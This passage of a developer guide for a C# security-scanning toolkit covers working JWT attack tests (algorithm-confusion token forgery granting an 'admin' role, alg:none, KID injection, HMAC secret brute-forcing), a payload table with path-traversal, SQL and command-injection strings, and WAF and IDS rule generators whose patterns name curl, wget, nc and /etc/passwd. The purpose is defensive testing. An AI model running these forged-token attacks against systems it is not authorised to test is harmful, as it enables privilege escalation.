    public static async Task<JwtAttackResult> TestAlgorithmConfusion(
        HttpClient client, string endpoint, string jwksUrl,
        string originalToken, Dictionary<string, object> payload)
    {
        // Step 1: Fetch the public key from JWKS endpoint
        var jwksResponse = await client.GetStringAsync(jwksUrl);

        // Step 2: Extract the RSA public key
        using var jwksDoc = JsonDocument.Parse(jwksResponse);
        var key = jwksDoc.RootElement.GetProperty("keys")[0];
        var n = key.GetProperty("n").GetString()!; // modulus
        var e = key.GetProperty("e").GetString()!; // exponent

        // Step 3: Create HS256 token using the public key PEM as secret
        var rsaParams = new System.Security.Cryptography.RSAParameters
        {
            Modulus = Base64UrlDecode(n),
            Exponent = Base64UrlDecode(e),
        };

        using var rsa = System.Security.Cryptography.RSA.Create();
        rsa.ImportParameters(rsaParams);
        var publicKeyPem = rsa.ExportRSAPublicKeyPem();

        // Step 4: Sign new token with HS256 using public key as HMAC secret
        var hmacKey = new Microsoft.IdentityModel.Tokens.SymmetricSecurityKey(
            Encoding.UTF8.GetBytes(publicKeyPem));

        var tokenDescriptor = new Microsoft.IdentityModel.Tokens.SecurityTokenDescriptor
        {
            Claims = payload,
            SigningCredentials = new Microsoft.IdentityModel.Tokens.SigningCredentials(
                hmacKey, Microsoft.IdentityModel.Tokens.SecurityAlgorithms.HmacSha256),
        };

        var handler = new JwtSecurityTokenHandler();
        var forgedToken = handler.CreateToken(tokenDescriptor);
        var forgedTokenString = handler.WriteToken(forgedToken);

        // Step 5: Test — change header to HS256
        var parts = forgedTokenString.Split('.');
        var headerJson = Encoding.UTF8.GetString(
            Convert.FromBase64String(PadBase64(parts[0])));
        var header = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(headerJson)!;
        header["alg"] = JsonSerializer.SerializeToElement("HS256");
        var newHeader = JsonSerializer.Serialize(header);
        var newHeaderB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(newHeader))
            .TrimEnd('=').Replace('+', '-').Replace('/', '_');

        var attackToken = $"{newHeaderB64}.{parts[1]}.{parts[2]}";

        var request = new HttpRequestMessage(HttpMethod.Get, endpoint);
        request.Headers.Authorization = new("Bearer", attackToken);
        var response = await client.SendAsync(request);

        return new JwtAttackResult
        {
            AttackName = "Algorithm Confusion (RS256→HS256)",
            Vulnerable = response.IsSuccessStatusCode,
            ResponseCode = (int)response.StatusCode,
            Severity = Severity.Critical,
            Recommendation = "Always pin the expected algorithm (e.g., RS256 only) " +
                "in TokenValidationParameters.ValidAlgorithms. Never trust the " +
                "alg header from the token."
        };
    }

    private static byte[] Base64UrlDecode(string input)
    {
        var padded = input.PadRight(input.Length + (4 - input.Length % 4) % 4, '=');
        return Convert.FromBase64String(padded.Replace('-', '+').Replace('_', '/'));
    }

    private static string PadBase64(string b) =>
        b.PadRight(b.Length + (4 - b.Length % 4) % 4, '=')
            .Replace('-', '+').Replace('_', '/');
}
```

### 4.7 Comprehensive JWT Vulnerability Scanner

```csharp
public class JwtVulnerabilityScanner
{
    private readonly HttpClient _httpClient;

    public JwtVulnerabilityScanner(HttpClient httpClient) => _httpClient = httpClient;

    public async Task<List<JwtVulnerability>> ScanAsync(
        string endpoint, string token,
        string? jwksUrl = null)
    {
        var findings = new List<JwtVulnerability>();

        // 1. Check expiration
        var decoded = JwtAnalyzer.DecodeWithoutValidation(token);
        if (decoded.Expiration > DateTime.UtcNow.AddDays(365))
        {
            findings.Add(new JwtVulnerability(
                "Excessive Expiration",
                $"Token expires on {decoded.Expiration} ({decoded.Expiration - DateTime.UtcNow:dd} days from now)",
                Severity.Medium,
                "Use short-lived tokens (≤ 1 hour) with refresh tokens."
            ));
        }

        // 2. Check if token has no expiration
        if (decoded.Expiration == DateTime.MinValue)
        {
            findings.Add(new JwtVulnerability(
                "No Expiration",
                "Token has no 'exp' claim — it never expires.",
                Severity.Critical,
                "Always include 'exp' claim in JWTs."
            ));
        }

        // 3. Check for sensitive data in payload
        var sensitiveKeys = new[] { "password", "secret", "ssn", "credit_card",
            "card_number", "cvv", "pin", "private_key" };
        foreach (var claim in decoded.Claims)
        {
            if (sensitiveKeys.Any(s => claim.Type.Contains(s, StringComparison.OrdinalIgnoreCase)))
            {
                findings.Add(new JwtVulnerability(
                    "Sensitive Data in JWT",
                    $"Claim '{claim.Type}' may contain sensitive data.",
                    Severity.High,
                    "Never store sensitive data in JWT payload. JWT payload is base64-encoded, not encrypted."
                ));
            }
        }

        // 4. Test alg:none attack
        var noneResult = await JwtAttackNoneAlgorithm.TestNoneAttack(
            _httpClient, endpoint, token);
        if (noneResult.Vulnerable)
        {
            findings.Add(new JwtVulnerability(
                "alg:none Accepted",
                "Server accepts tokens with 'alg':'none' (no signature).",
                Severity.Critical,
                noneResult.Recommendation
            ));
        }

        // 5. Test KID injection
        foreach (var kidPayload in JwtAttackKidInjection.GenerateKidInjectionPayloads().Take(5))
        {
            var kidToken = JwtAttackKidInjection.CreateKidModifiedToken(token, kidPayload);

            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, endpoint);
                request.Headers.Authorization = new("Bearer", kidToken);
                var response = await _httpClient.SendAsync(request);

                if (response.IsSuccessStatusCode)
                {
                    findings.Add(new JwtVulnerability(
                        "KID Injection Possible",
                        $"KID='{kidPayload}' returned {(int)response.StatusCode}",
                        Severity.Critical,
                        "Validate KID values against a whitelist. Never use KID in file paths or SQL queries directly."
                    ));
                    break;
                }
            }
            catch { }
        }

        // 6. Test weak HMAC secrets
        var weakSecrets = await JwtAttackWeakHmac.BruteForceWeakSecrets(token);
        if (weakSecrets.Any())
        {
            findings.Add(new JwtVulnerability(
                "Weak HMAC Secret",
                $"Cracked with secret: '{weakSecrets.First().Secret}'",
                Severity.Critical,
                "Use a strong random secret (≥256 bits). Store it in a vault, not in code."
            ));
        }

        // 7. Test algorithm confusion if JWKS URL provided
        if (jwksUrl != null)
        {
            try
            {
                var confusionResult = await JwtAttackAlgorithmConfusion.TestAlgorithmConfusion(
                    _httpClient, endpoint, jwksUrl, token,
                    new Dictionary<string, object>
                    {
                        ["sub"] = decoded.Subject,
                        ["role"] = "admin",
                        ["iat"] = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                        ["exp"] = DateTimeOffset.UtcNow.AddHours(1).ToUnixTimeSeconds(),
                    });

                if (confusionResult.Vulnerable)
                {
                    findings.Add(new JwtVulnerability(
                        "Algorithm Confusion",
                        "Server allows RS256→HS256 confusion attack.",
                        Severity.Critical,
                        confusionResult.Recommendation
                    ));
                }
            }
            catch { /* JWKS fetch failed, skip */ }
        }

        // 8. Check if HTTPS is on jku/jwk fields
        if (decoded.Header.Contains("\"jku\"") || decoded.Header.Contains("\"jwk\""))
        {
            findings.Add(new JwtVulnerability(
                "JWK/JKU Headers Present",
                "Token uses jku or jwk header. Verify these are validated properly.",
                Severity.Medium,
                "If using jku/jwk, ensure URLs are HTTPS and pinned to trusted domains."
            ));
        }

        return findings;
    }
}

public record JwtVulnerability(
    string Name,
    string Description,
    Severity Severity,
    string Recommendation
);
```

### 4.8 Common JWT Vulnerabilities Summary

| Vulnerability | Detection | Severity |
|--------------|-----------|----------|
| alg:none accepted | Send token with `"alg":"none"`, no signature | Critical |
| Algorithm confusion | Sign HS256 with RSA public key as secret | Critical |
| Weak HMAC secret | Brute-force common passwords | Critical |
| KID path traversal | `../../etc/passwd` in kid header | Critical |
| KID SQL injection | `' OR 1=1` in kid header | High |
| KID command injection | `$(id)` in kid header | High |
| No expiration (exp) | Missing exp claim | Critical |
| Excessive expiration | exp > 30 days | Medium |
| Sensitive data in payload | password/ssn in claims | High |
| jku/jwk injection | Open redirect in jku | High |
| Missing audience (aud) | No aud claim | Low |
| Not-before bypass | Modify nbf claim | Low |
| Token not invalidated on logout | No revocation mechanism | Medium |

---

## 5. Blazor Server Quick Start

### 5.1 Create Blazor Server Project in .NET 8+

```bash
# Create a new Blazor Server project (interactive server-side rendering)
dotnet new blazorserver -n SecKit.Dashboard -o SecKit.Dashboard
```

### 5.2 Add to Existing Solution

```bash
# From the solution root (SecKit.sln)
cd SecKit/
dotnet new blazorserver -n SecKit.Dashboard -o SecKit.Dashboard
dotnet sln add SecKit.Dashboard/SecKit.Dashboard.csproj
```

### 5.3 Minimal Blazor Server Project Structure

```
SecKit.Dashboard/
├── Program.cs
├── SecKit.Dashboard.csproj
├── appsettings.json
├── Components/
│   ├── App.razor
│   ├── Routes.razor
│   ├── Layout/
│   │   ├── MainLayout.razor
│   │   └── NavMenu.razor
│   └── Pages/
│       ├── Home.razor
│       ├── Scan.razor          # Scan execution page
│       ├── Results.razor       # Scan results display
│       └── Settings.razor      # Configuration
├── Services/
│   └── ScanService.cs          # Bridge to SecKit.Core
└── wwwroot/
```

### 5.4 Project File (SecKit.Dashboard.csproj)

```xml
<Project Sdk="Microsoft.NET.Sdk.Web">

  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
  </PropertyGroup>

  <ItemGroup>
    <!-- Reference the core library -->
    <ProjectReference Include="..\SecKit.Core\SecKit.Core.csproj" />
  </ItemGroup>

</Project>
```

### 5.5 Minimal Program.cs

```csharp
using SecKit.Dashboard.Components;
using SecKit.Dashboard.Services;
using SecKit.Core; // Your existing core library

var builder = WebApplication.CreateBuilder(args);

// Add Blazor services
builder.Services.AddRazorComponents()
    .AddInteractiveServerComponents();

// Register SecKit services
builder.Services.AddSingleton<ScanService>();
builder.Services.AddSingleton<IScanOrchestrator, ScanOrchestrator>(); // From Core

// Register HttpClient for API calls
builder.Services.AddHttpClient();

var app = builder.Build();

if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler("/Error");
    app.UseHsts();
}

app.UseStaticFiles();
app.UseAntiforgery();

app.MapRazorComponents<App>()
    .AddInteractiveServerRenderMode();

app.Run();
```

### 5.6 Bridge Service — Calling SecKit.Core from Blazor

```csharp
// Services/ScanService.cs
using SecKit.Core;
using SecKit.Core.Hardening;
using SecKit.Core.Docker;
using SecKit.Core.Cloud.AWS;

namespace SecKit.Dashboard.Services;

/// <summary>
/// Bridges Blazor UI to SecKit.Core scan modules.
/// Provides progress reporting via events for real-time UI updates.
/// </summary>
public class ScanService
{
    private readonly ILogger<ScanService> _logger;

    // Events for real-time progress (Blazor components subscribe)
    public event Action<string, int, int>? OnProgressChanged;
    public event Action<string, object>? OnModuleComplete;
    public event Action<List<ScanFinding>>? OnScanComplete;

    public ScanService(ILogger<ScanService> logger)
    {
        _logger = logger;
    }

    /// <summary>
    /// Run a full scan with progress reporting.
    /// </summary>
    public async Task RunFullScanAsync(ScanConfig config)
    {
        var findings = new List<ScanFinding>();
        var modules = new List<string> { "SSH", "Users", "Processes", "Cron", "Filesystem",
            "Kernel", "Docker", "AWS" };
        int total = modules.Count;
        int completed = 0;

        // Local SSH audit
        if (config.EnableSshAudit)
        {
            NotifyProgress("SSH Audit", completed, total);
            var executor = new LocalCommandExecutor();
            var sshAuditor = new SshAuditor(executor);
            var result = await sshAuditor.AuditAsync();
            findings.AddRange(result.ConfigChecks.Select(c => new ScanFinding(
                "SSH", c.Key, c.Actual, c.Recommended,
                c.Status.ToString(), c.Detail)));
            completed++;
        }

        // User audit
        if (config.EnableUserAudit)
        {
            NotifyProgress("User Audit", completed, total);
            var executor = new LocalCommandExecutor();
            var userAuditor = new UserAuditor(executor);
            var result = await userAuditor.AuditAsync();

            if (result.UsersWithUid0.Count > 1)
                findings.Add(new ScanFinding("Users", "Multiple UID 0",
                    string.Join(", ", result.UsersWithUid0), "Only root",
                    "Fail", "Multiple users have root (UID 0)"));

            if (result.EmptyPasswords.Any())
                findings.Add(new ScanFinding("Users", "Empty Passwords",
                    string.Join(", ", result.EmptyPasswords), "No empty passwords",
                    "Critical", "Accounts with empty passwords found"));
            completed++;
        }

        // ... repeat for all modules ...

        completed = total;
        NotifyProgress("Complete", completed, total);
        OnScanComplete?.Invoke(findings);
    }

    private void NotifyProgress(string module, int completed, int total)
    {
        OnProgressChanged?.Invoke(module, completed, total);
    }
}

public class ScanConfig
{
    public bool EnableSshAudit { get; set; } = true;
    public bool EnableUserAudit { get; set; } = true;
    public bool EnableProcessAudit { get; set; } = true;
    public bool EnableCronAudit { get; set; } = true;
    public bool EnableFilesystemAudit { get; set; } = true;
    public bool EnableKernelAudit { get; set; } = true;
    public bool EnableDockerAudit { get; set; } = true;
    public bool EnableAwsAudit { get; set; } = true;
}

public record ScanFinding(
    string Module, string Check, string Actual,
    string Expected, string Status, string Detail
);
```

### 5.7 Real-Time UI with Server-Sent Events (Timer-Based Polling)

```razor
@* Components/Pages/Scan.razor *@
@page "/scan"
@using SecKit.Dashboard.Services
@inject ScanService ScanService
@implements IDisposable

<PageTitle>SecKit Scan</PageTitle>

<div class="container mt-4">
    <h3>Security Scan Dashboard</h3>

    @if (_isScanning)
    {
        <div class="alert alert-info">
            <div class="spinner-border spinner-border-sm me-2" role="status"></div>
            Scanning: @_currentModule (@_completedModules/@_totalModules)
        </div>
        <div class="progress mb-3">
            <div class="progress-bar progress-bar-striped progress-bar-animated"
                 style="width: @(_totalModules > 0 ? (_completedModules * 100 / _totalModules) : 0)%">
                @(_totalModules > 0 ? _completedModules * 100 / _totalModules : 0)%
            </div>
        </div>
    }
    else
    {
        <button class="btn btn-primary btn-lg" @onclick="StartScan" disabled="@_isScanning">
            <i class="bi bi-shield-check"></i> Start Full Scan
        </button>
    }

    @if (_findings.Any())
    {
        <h4 class="mt-4">Findings (@_findings.Count)</h4>
        <table class="table table-striped">
            <thead>
                <tr>
                    <th>Module</th>
                    <th>Check</th>
                    <th>Status</th>
                    <th>Detail</th>
                </tr>
            </thead>
            <tbody>
                @foreach (var f in _findings.OrderByDescending(f => f.Status == "Fail"))
                {
                    <tr class="@(f.Status == "Fail" ? "table-danger" :
                                f.Status == "Warning" ? "table-warning" : "")">
                        <td>@f.Module</td>
                        <td>@f.Check</td>
                        <td>
                            <span class="badge bg-@(f.Status switch {
                                "Fail" or "Critical" => "danger",
                                "Warning" => "warning",
                                _ => "success"
                            })">@f.Status</span>
                        </td>
                        <td>@f.Detail</td>
                    </tr>
                }
            </tbody>
        </table>
    }
</div>

@code {
    private bool _isScanning;
    private string _currentModule = "";
    private int _completedModules;
    private int _totalModules;
    private List<ScanFinding> _findings = new();
    private System.Threading.Timer? _refreshTimer;

    protected override void OnInitialized()
    {
        ScanService.OnProgressChanged += HandleProgress;
        ScanService.OnScanComplete += HandleScanComplete;

        // Periodic timer to force UI refresh during scan
        _refreshTimer = new System.Threading.Timer(_ =>
        {
            InvokeAsync(StateHasChanged);
        }, null, 500, 500);
    }

    private async Task StartScan()
    {
        _isScanning = true;
        _findings.Clear();
        StateHasChanged();

        var config = new ScanConfig();
        await Task.Run(() => ScanService.RunFullScanAsync(config));
    }

    private void HandleProgress(string module, int completed, int total)
    {
        _currentModule = module;
        _completedModules = completed;
        _totalModules = total;
        InvokeAsync(StateHasChanged);
    }

    private void HandleScanComplete(List<ScanFinding> findings)
    {
        _findings = findings;
        _isScanning = false;
        InvokeAsync(StateHasChanged);
    }

    public void Dispose()
    {
        ScanService.OnProgressChanged -= HandleProgress;
        ScanService.OnScanComplete -= HandleScanComplete;
        _refreshTimer?.Dispose();
    }
}
```

### 5.8 Alternative: Real-Time with SignalR Hub

```csharp
// Services/ScanHub.cs
using Microsoft.AspNetCore.SignalR;

namespace SecKit.Dashboard.Hubs;

public class ScanHub : Hub
{
    public async Task JoinScanGroup(string scanId)
        => await Groups.AddToGroupAsync(Context.ConnectionId, scanId);
}

// Register in Program.cs:
// builder.Services.AddSignalR();
// app.MapHub<ScanHub>("/scanhub");

// Then in ScanService, inject IHubContext<ScanHub> and use:
// await _hubContext.Clients.All.SendAsync("ScanProgress", module, completed, total);
```

```javascript
// wwwroot/js/scan.js (SignalR client)
const connection = new signalR.HubConnectionBuilder()
    .withUrl("/scanhub")
    .build();

connection.on("ScanProgress", (module, completed, total) => {
    document.getElementById("progress-module").textContent = module;
    document.getElementById("progress-bar").style.width = (completed/total*100) + "%";
    document.getElementById("progress-text").textContent = completed + "/" + total;
});

connection.start();
```

---

## 6. WAF/IDS Rule Generation

### 6.1 ModSecurity Rule Format

ModSecurity uses the SecRule directive with a modified regex syntax.

```
# Basic format:
SecRule VARIABLE OPERATOR [ACTIONS]

# Example SQLi rule:
SecRule ARGS "@detectSQLi" \
    "id:100001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attempt Detected',\
    logdata:'Matched Data: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli',\
    severity:'CRITICAL',\
    setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"

# XSS rule:
SecRule ARGS|REQUEST_HEADERS "@rx <script.*?>" \
    "id:100002,\
    phase:2,\
    block,\
    msg:'XSS Attack Detected',\
    tag:'attack-xss',\
    severity:'CRITICAL'"
```

### 6.2 C# ModSecurity Rule Generator

```csharp
namespace SecKit.Core.WafRules;

public class ModSecurityRuleGenerator
{
    private int _nextRuleId = 100000;

    /// <summary>
    /// Generate ModSecurity rules for common attack patterns found during scan.
    /// </summary>
    public List<ModSecurityRule> GenerateRules(List<ScanVulnerability> vulnerabilities)
    {
        var rules = new List<ModSecurityRule>();

        foreach (var vuln in vulnerabilities)
        {
            rules.AddRange(vuln.Type switch
            {
                "sqli" => GenerateSqliRules(vuln),
                "xss" => GenerateXssRules(vuln),
                "path_traversal" => GeneratePathTraversalRules(vuln),
                "file_inclusion" => GenerateFileInclusionRules(vuln),
                "command_injection" => GenerateCommandInjectionRules(vuln),
                _ => Array.Empty<ModSecurityRule>()
            });
        }

        return rules;
    }

    private List<ModSecurityRule> GenerateSqliRules(ScanVulnerability vuln)
    {
        var rules = new List<ModSecurityRule>();
        int id = Interlocked.Increment(ref _nextRuleId);

        // Classic SQLi patterns
        rules.Add(new ModSecurityRule
        {
            RuleId = id,
            Phase = 2,
            Variables = "ARGS|REQUEST_BODY",
            Operator = "@rx (?i)(union\\s+select|select\\s+.*\\s+from|insert\\s+into|drop\\s+table|delete\\s+from|update\\s+.*\\s+set|--[\\s]|\\/\\*.*\\*\\/|;\\s*shutdown)",
            Action = "block",
            Message = "SQL Injection Attempt Detected",
            Severity = "CRITICAL",
            Tags = new[] { "application-multi", "attack-sqli" },
            RawRule = GenerateRawRule(id, 2, "ARGS|REQUEST_BODY",
                "@rx (?i)(union\\s+select|select\\s+.*\\s+from|insert\\s+into|drop\\s+table|delete\\s+from|update\\s+.*\\s+set)",
                "block", "SQL Injection Attempt Detected", "CRITICAL",
                new[] { "attack-sqli" }),
        });

        // Time-based blind SQLi
        rules.Add(new ModSecurityRule
        {
            RuleId = Interlocked.Increment(ref _nextRuleId),
            Phase = 2,
            Variables = "ARGS",
            Operator = "@rx (?i)(sleep\\(|benchmark\\(|pg_sleep\\()",
            Action = "block",
            Message = "Time-Based SQL Injection Detected",
            Severity = "CRITICAL",
            Tags = new[] { "attack-sqli", "time-based" },
            RawRule = GenerateRawRule(id + 1, 2, "ARGS",
                "@rx (?i)(sleep\\(|benchmark\\(|pg_sleep\\()",
                "block", "Time-Based SQL Injection Detected", "CRITICAL",
                new[] { "attack-sqli" }),
        });

        return rules;
    }

    private List<ModSecurityRule> GenerateXssRules(ScanVulnerability vuln)
    {
        int id = Interlocked.Increment(ref _nextRuleId);
        return new List<ModSecurityRule>
        {
            new()
            {
                RuleId = id,
                Phase = 2,
                Variables = "ARGS|REQUEST_HEADERS",
                Operator = "@rx (?i)(<script|javascript:|onerror=|onload=|onclick=|onmouseover=|alert\\s*\\(|document\\.cookie|eval\\s*\\(|expression\\s*\\()",
                Action = "block",
                Message = "Cross-Site Scripting (XSS) Detected",
                Severity = "CRITICAL",
                Tags = new[] { "attack-xss" },
                RawRule = GenerateRawRule(id, 2, "ARGS|REQUEST_HEADERS",
                    "@rx (?i)(<script|javascript:|onerror=|onload=|onclick=|alert\\s*\\()",
                    "block", "Cross-Site Scripting (XSS) Detected", "CRITICAL",
                    new[] { "attack-xss" }),
            }
        };
    }

    private List<ModSecurityRule> GeneratePathTraversalRules(ScanVulnerability vuln)
    {
        int id = Interlocked.Increment(ref _nextRuleId);
        return new List<ModSecurityRule>
        {
            new()
            {
                RuleId = id,
                Phase = 2,
                Variables = "ARGS|REQUEST_URI|REQUEST_HEADERS",
                Operator = "@rx (?i)(\\.\\.\\/|\\.\\.\\\\|\\.\\.%2f|\\.\\.%5c|%2e%2e%2f|%2e%2e/)",
                Action = "block",
                Message = "Path Traversal Attempt Detected",
                Severity = "CRITICAL",
                Tags = new[] { "attack-lfi", "attack-path-traversal" },
            }
        };
    }

    private List<ModSecurityRule> GenerateFileInclusionRules(ScanVulnerability vuln)
    {
        int id = Interlocked.Increment(ref _nextRuleId);
        return new List<ModSecurityRule>
        {
            new()
            {
                RuleId = id,
                Phase = 2,
                Variables = "ARGS",
                Operator = "@rx (?i)(/etc/passwd|/proc/self/environ|php://|file://|expect://|data://|phar://)",
                Action = "block",
                Message = "File Inclusion Attempt",
                Severity = "CRITICAL",
                Tags = new[] { "attack-lfi", "attack-rfi" },
            }
        };
    }

    private List<ModSecurityRule> GenerateCommandInjectionRules(ScanVulnerability vuln)
    {
        int id = Interlocked.Increment(ref _nextRuleId);
        return new List<ModSecurityRule>
        {
            new()
            {
                RuleId = id,
                Phase = 2,
                Variables = "ARGS|REQUEST_HEADERS|REQUEST_BODY",
                Operator = "@rx (?i)(;\\s*(id|whoami|cat |ls |pwd|uname|wget|curl|nc |bash |sh |python |perl )|\\|\\s*(id|whoami|cat )|\\$\\()",
                Action = "block",
                Message = "Command Injection Attempt",
                Severity = "CRITICAL",
                Tags = new[] { "attack-rce", "attack-command-injection" },
            }
        };
    }

    /// <summary>
    /// Write rules to a ModSecurity .conf file.
    /// </summary>
    public string WriteRulesFile(List<ModSecurityRule> rules)
    {
        var sb = new StringBuilder();
        sb.AppendLine("# Generated by SecKit v2");
        sb.AppendLine($"# Generated: {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC");
        sb.AppendLine($"# Rules: {rules.Count}");
        sb.AppendLine();

        foreach (var rule in rules)
        {
            var raw = GenerateRawRule(
                rule.RuleId, rule.Phase, rule.Variables, rule.Operator,
                rule.Action, rule.Message, rule.Severity, rule.Tags);
            sb.AppendLine(raw);
            sb.AppendLine();
        }

        return sb.ToString();
    }

    private static string GenerateRawRule(int id, int phase, string variables,
        string op, string action, string msg, string severity, string[] tags)
    {
        var tagsStr = string.Join(",\\\n    ", tags.Select(t => $"tag:'{t}'"));
        return $@"SecRule {variables} ""{op}"" \
    ""id:{id},\
    phase:{phase},\
    {action},\
    msg:'{msg}',\
    {tagsStr},\
    severity:'{severity}'""";
    }
}

public class ModSecurityRule
{
    public int RuleId { get; init; }
    public int Phase { get; init; }
    public string Variables { get; init; } = "";
    public string Operator { get; init; } = "";
    public string Action { get; init; } = "";
    public string Message { get; init; } = "";
    public string Severity { get; init; } = "";
    public string[] Tags { get; init; } = Array.Empty<string>();
    public string RawRule { get; init; } = "";
}

public record ScanVulnerability(
    string Type,
    string Endpoint,
    string Parameter,
    string Payload,
    string Description
);
```

### 6.3 Cloudflare WAF Rule JSON Generator

```csharp
public class CloudflareWafRuleGenerator
{
    /// <summary>
    /// Generate Cloudflare WAF custom rules in JSON format.
    /// Cloudflare uses the Rulesets API with "custom" phase.
    /// </summary>
    public string GenerateCloudflareRulesJson(List<ScanVulnerability> vulns, string zoneId)
    {
        var rules = new List<object>();

        foreach (var vuln in vulns)
        {
            var rule = vuln.Type switch
            {
                "sqli" => CreateCloudflareSqliRule(vuln),
                "xss" => CreateCloudflareXssRule(vuln),
                "path_traversal" => CreateCloudflarePathTraversalRule(vuln),
                _ => null
            };

            if (rule != null) rules.Add(rule);
        }

        var payload = new
        {
            description = "SecKit v2 Generated WAF Rules",
            rules = rules.ToArray()
        };

        return JsonSerializer.Serialize(payload, new JsonSerializerOptions
        {
            WriteIndented = true
        });
    }

    private object CreateCloudflareSqliRule(ScanVulnerability vuln)
    {
        return new
        {
            description = $"Block SQLi — {vuln.Endpoint}",
            expression = "(http.request.uri.query contains \"union select\" or " +
                         "http.request.uri.query contains \"or 1=1\" or " +
                         "http.request.uri.query contains \"' or '\" or " +
                         "http.request.body.raw contains \"union select\" or " +
                         "http.request.body.raw contains \"drop table\")",
            action = "block",
            enabled = true
        };
    }

    private object CreateCloudflareXssRule(ScanVulnerability vuln)
    {
        return new
        {
            description = $"Block XSS — {vuln.Endpoint}",
            expression = "(http.request.uri.query contains \"<script\" or " +
                         "http.request.uri.query contains \"javascript:\" or " +
                         "http.request.uri.query contains \"onerror=\" or " +
                         "http.request.body.raw contains \"<script\" or " +
                         "http.request.body.raw contains \"onerror=\")",
            action = "block",
            enabled = true
        };
    }

    private object CreateCloudflarePathTraversalRule(ScanVulnerability vuln)
    {
        return new
        {
            description = $"Block Path Traversal — {vuln.Endpoint}",
            expression = "(http.request.uri.path contains \"..%2f\" or " +
                         "http.request.uri.path contains \"../\" or " +
                         "http.request.uri.query contains \"../\" or " +
                         "http.request.uri.query contains \"..\\\\\")",
            action = "block",
            enabled = true
        };
    }
}
```

### 6.4 Snort/Suricata Rule Generator

```csharp
public class SuricataRuleGenerator
{
    private int _nextSid = 1000000;

    /// <summary>
    /// Generate Suricata/Snort IDS rules.
    /// Format: action proto src_ip src_port -> dst_ip dst_port (msg:"..."; content:"..."; sid:...;)
    /// </summary>
    public List<string> GenerateSuricataRules(List<ScanVulnerability> vulns)
    {
        var rules = new List<string>();

        foreach (var vuln in vulns)
        {
            switch (vuln.Type)
            {
                case "sqli":
                    rules.Add(GenerateSuricataSqliRule());
                    break;
                case "xss":
                    rules.Add(GenerateSuricataXssRule());
                    break;
                case "command_injection":
                    rules.Add(GenerateSuricataCommandInjectionRule());
                    break;
                case "path_traversal":
                    rules.Add(GenerateSuricataPathTraversalRule());
                    break;
            }
        }

        return rules;
    }

    private string GenerateSuricataSqliRule()
    {
        int sid = Interlocked.Increment(ref _nextSid);
        return $@"alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:""SQL Injection Attempt Detected"";
    flow:to_server,established;
    content:""union""; nocase; http_uri;
    content:""select""; nocase; http_uri; distance:0;
    classtype:web-application-attack;
    sid:{sid};
    rev:1;
    metadata:created_at {DateTime.UtcNow:yyyy_MM_dd}, by SecKit_v2;
    priority:1;
)";
    }

    private string GenerateSuricataXssRule()
    {
        int sid = Interlocked.Increment(ref _nextSid);
        return $@"alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:""Cross-Site Scripting (XSS) Attempt"";
    flow:to_server,established;
    content:""<script""; nocase; http_uri;
    classtype:web-application-attack;
    sid:{sid};
    rev:1;
    metadata:created_at {DateTime.UtcNow:yyyy_MM_dd}, by SecKit_v2;
    priority:1;
)";
    }

    private string GenerateSuricataCommandInjectionRule()
    {
        int sid = Interlocked.Increment(ref _nextSid);
        return $@"alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:""Command Injection Attempt"";
    flow:to_server,established;
    content:"";id""; nocase; http_uri;
    content:"";whoami""; nocase; http_uri;
    content:""|24 28|""; nocase; http_uri;
    classtype:attempted-admin;
    sid:{sid};
    rev:1;
    metadata:created_at {DateTime.UtcNow:yyyy_MM_dd}, by SecKit_v2;
    priority:1;
)";
    }

    private string GenerateSuricataPathTraversalRule()
    {
        int sid = Interlocked.Increment(ref _nextSid);
        return $@"alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:""Path Traversal Attempt"";
    flow:to_server,established;
    content:""../""; http_uri;
    content:""..|5c|""; http_uri;
    content:""%2e%2e/""; nocase; http_uri;
    classtype:web-application-attack;
    sid:{sid};
    rev:1;
    metadata:created_at {DateTime.UtcNow:yyyy_MM_dd}, by SecKit_v2;
    priority:1;
)";
    }
}
```

---

## 7. Agent/Background Service in .NET

### 7.1 Worker Service Template (BackgroundService)

```bash
# Create a Worker Service project
dotnet new worker -n SecKit.Agent -o SecKit.Agent
dotnet sln add SecKit.Agent/SecKit.Agent.csproj
```

### 7.2 Project File

```xml
<Project Sdk="Microsoft.NET.Sdk.Worker">

  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
    <PublishSingleFile>true</PublishSingleFile>
    <RuntimeIdentifier>linux-x64</RuntimeIdentifier>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="Microsoft.Extensions.Hosting" Version="8.0.*" />
    <PackageReference Include="Microsoft.Extensions.Hosting.Systemd" Version="8.0.*" />
    <PackageReference Include="Microsoft.Extensions.Hosting.WindowsServices" Version="8.0.*" />
    <PackageReference Include="Telegram.Bot" Version="19.0.*" />
  </ItemGroup>

  <ItemGroup>
    <ProjectReference Include="..\SecKit.Core\SecKit.Core.csproj" />
  </ItemGroup>

</Project>
```

### 7.3 Program.cs — Cross-Platform Hosting

```csharp
using SecKit.Agent;
using SecKit.Core.Hardening;
using SecKit.Core.Docker;

var builder = Host.CreateApplicationBuilder(args);

// Add systemd integration (Linux) or Windows Service
if (OperatingSystem.IsLinux())
    builder.Services.AddSystemd();
else if (OperatingSystem.IsWindows())
    builder.Services.AddWindowsService(options =>
    {
        options.ServiceName = "SecKit Agent";
    });

// Register scan services
builder.Services.AddSingleton<ScanOrchestrator>();
builder.Services.AddSingleton<LocalCommandExecutor>();
builder.Services.AddSingleton<TelegramNotifier>();
builder.Services.AddSingleton<ScanScheduler>();

// Register the main worker
builder.Services.AddHostedService<SecKitWorker>();

var host = builder.Build();
host.Run();
```

